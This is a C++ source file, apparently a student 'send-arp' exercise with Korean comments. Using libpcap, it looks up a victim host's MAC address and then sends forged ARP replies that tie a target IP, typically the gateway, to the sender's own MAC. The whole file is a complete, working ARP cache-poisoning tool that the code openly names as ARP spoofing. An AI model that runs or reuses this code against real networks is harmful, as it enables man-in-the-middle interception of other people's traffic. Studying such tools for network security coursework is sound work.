#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// interface로부터 MAC 주소를 얻는 함수
Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        fprintf(stderr, "Cannot open socket\n");
        return Mac::nullMac();
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "Cannot get MAC address for %s\n", dev);
        close(fd);
        return Mac::nullMac();
    }

    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// Sender의 MAC 주소를 얻는 함수
Mac get_sender_mac(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket request_packet;

    // Ethernet 헤더 설정
    request_packet.eth_.dmac_ = Mac::broadcastMac();
    request_packet.eth_.smac_ = my_mac;
    request_packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더 설정
    request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    request_packet.arp_.pro_ = htons(EthHdr::Ip4);
    request_packet.arp_.hln_ = Mac::Size;
    request_packet.arp_.pln_ = Ip::Size;
    request_packet.arp_.op_ = htons(ArpHdr::Request);
    request_packet.arp_.smac_ = my_mac;
    request_packet.arp_.sip_ = htonl(my_ip);
    request_packet.arp_.tmac_ = Mac::nullMac();
    request_packet.arp_.tip_ = htonl(sender_ip);

    // Request 패킷 전송
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac::nullMac();
    }

    // Reply 패킷 수신 대기
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (true) {
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return Mac::nullMac();

        EthArpPacket* reply = (EthArpPacket*)packet;
        if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(reply->arp_.sip_) == sender_ip)
            return reply->arp_.smac_;
    }
}

// ARP Spoofing 패킷 전송 함수
void send_arp_spoof(pcap_t* pcap, Mac my_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // pcap 초기화 (패킷 수신을 위해 적절한 값 설정)
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    // 자신의 MAC 주소 획득
    Mac my_mac = get_my_mac(dev);
    if (my_mac.isNull()) {
        fprintf(stderr, "Failed to get my MAC address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 네트워크 인터페이스의 IP 주소 획득
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "Failed to get interface IP address\n");
        close(fd);
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    close(fd);
    Ip my_ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));

    // 모든 sender-target 쌍에 대해 ARP Spoofing 수행
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);

        printf("Getting MAC address for sender IP %s\n", std::string(sender_ip).c_str());

        // Sender의 MAC 주소 획득
        Mac sender_mac = get_sender_mac(pcap, my_mac, my_ip, sender_ip);
        if (sender_mac.isNull()) {
            fprintf(stderr, "Failed to get sender MAC address\n");
            continue;
        }

        printf("Sending ARP spoofing packet to %s\n", std::string(sender_ip).c_str());

        // ARP Spoofing 수행
        send_arp_spoof(pcap, my_mac, sender_mac, sender_ip, target_ip);
    }

    pcap_close(pcap);
    return 0;
}
